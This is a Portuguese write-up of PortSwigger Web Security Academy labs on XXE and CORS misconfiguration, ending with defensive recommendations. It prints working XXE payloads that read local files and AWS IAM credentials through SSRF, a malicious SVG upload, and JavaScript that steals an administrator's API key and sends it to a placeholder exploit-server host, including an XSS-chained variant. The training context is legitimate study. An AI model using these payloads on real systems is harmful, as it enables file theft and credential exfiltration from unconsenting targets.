# Writeup: PortSwigger Web Security Academy - XXE e CORS

## Ambiente
- Atacante: Kali Linux (VM VirtualBox)
- Alvo: Laboratórios do PortSwigger Web Security Academy (hospedados remotamente)
- Ferramentas: Burp Suite (Proxy, Repeater, Intruder), Exploit Server do PortSwigger

---

## Parte 1 — XXE (XML External Entity)

### Lab 1: Exploiting XXE using external entities to retrieve files (Apprentice)
Funcionalidade "Check stock" envia XML ao servidor. Injeção de
entidade externa no DOCTYPE pra ler arquivo local:

    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>

Resultado: conteúdo de /etc/passwd retornado na resposta de erro
("Invalid product ID: root:x:0:0...").

### Lab 2: Exploiting XXE to perform SSRF attacks (Apprentice)
Mesma vulnerabilidade, mas apontando pra endpoint interno da AWS
(EC2 metadata service):

    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">

Resultado: credenciais IAM completas expostas (AccessKeyId,
SecretAccessKey, Token) — em ambiente real daria acesso a todos
os serviços AWS da conta.

### Lab 3: Exploiting XInclude to retrieve files (Practitioner)
Aplicação embute a entrada do usuário dentro de um XML próprio,
impedindo injeção de DOCTYPE. Bypass via XInclude, injetado
diretamente no valor de um parâmetro de formulário:

    productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1

Resultado: /etc/passwd extraído sem controle do XML completo.

### Lab 4: Exploiting XXE via image file upload (Practitioner)
Superfície de ataque: upload de avatar SVG (formato XML).
Arquivo SVG malicioso criado localmente:

    <?xml version="1.0" standalone="yes"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
    <svg xmlns="http://www.w3.org/2000/svg" width="128px" height="128px">
    <text font-size="16" x="0" y="16">&xxe;</text>
    </svg>

Após upload como avatar de comentário, a biblioteca Apache Batik
processou o SVG e renderizou o conteúdo de /etc/hostname como
texto na imagem gerada. Hostname obtido: b94f95f61b71.

---

## Parte 2 — CORS Misconfiguration

### Lab 1: CORS vulnerability with basic origin reflection (Apprentice)
Servidor reflete qualquer valor do header Origin com
Access-Control-Allow-Credentials: true. Endpoint /accountDetails
retorna API key do usuário autenticado.

Exploit hospedado no Exploit Server (JavaScript):

    var req = new XMLHttpRequest();
    req.open('get','https://LAB/accountDetails',true);
    req.withCredentials = true;
    req.send();
    req.onload = function() {
        location='https://EXPLOIT_SERVER/log?key='+this.responseText;
    };

Após entrega à vítima (administrador), a API key foi capturada
no log de acesso do Exploit Server.

### Lab 2: CORS vulnerability with trusted null origin (Apprentice)
Servidor confia especificamente na origem "null". Navegadores
enviam Origin: null em iframes com sandbox + data: URL. Exploit:

    <iframe sandbox="allow-scripts allow-top-navigation allow-forms"
    src="data:text/html,<script>
    [mesmo JavaScript do Lab 1, apontando para /accountDetails]
    </script>"></iframe>

API key do administrador capturada no log.

### Lab 3: CORS vulnerability with trusted insecure protocols (Practitioner)
Servidor confia em todos os subdomínios, incluindo via HTTP
(inseguro). Ataque em duas etapas:

1. XSS identificado no subdomínio HTTP:
   http://stock.LAB/?productId=<script>alert(1)</script>&storeId=1

2. Exploit encadeia XSS + CORS: redireciona vítima ao subdomínio
   com XSS que executa requisição autenticada ao domínio principal:

    document.location="http://stock.LAB/?productId=
    %3cscript%3e
    var req = new XMLHttpRequest();
    req.open('get','https://LAB/accountDetails',true);
    req.withCredentials = true;
    req.send();
    req.onload = function() {
        location='https://EXPLOIT_SERVER/log?key='+this.responseText;
    };
    %3c/script%3e&storeId=1"

Como o subdomínio stock. é confiável pelo CORS, a resposta
autenticada pôde ser lida, expondo a API key do administrador.

---

## Conclusão geral
Sete laboratórios cobrindo XXE (leitura de arquivo, SSRF via XML,
XInclude, e upload de SVG malicioso) e CORS (reflexão de origin,
null origin, e subdomínio HTTP inseguro com XSS encadeado).

Recomendações gerais:
- XXE: desabilitar processamento de entidades externas no parser
  XML (feature "external-general-entities"); usar parsers seguros
  por padrão; nunca processar SVG de upload com bibliotecas que
  executam entidades externas
- CORS: nunca refletir o Origin header sem validação; usar
  allowlist explícita de origens; não confiar em subdomínios via
  HTTP; nunca combinar Access-Control-Allow-Origin: * com
  Access-Control-Allow-Credentials: true
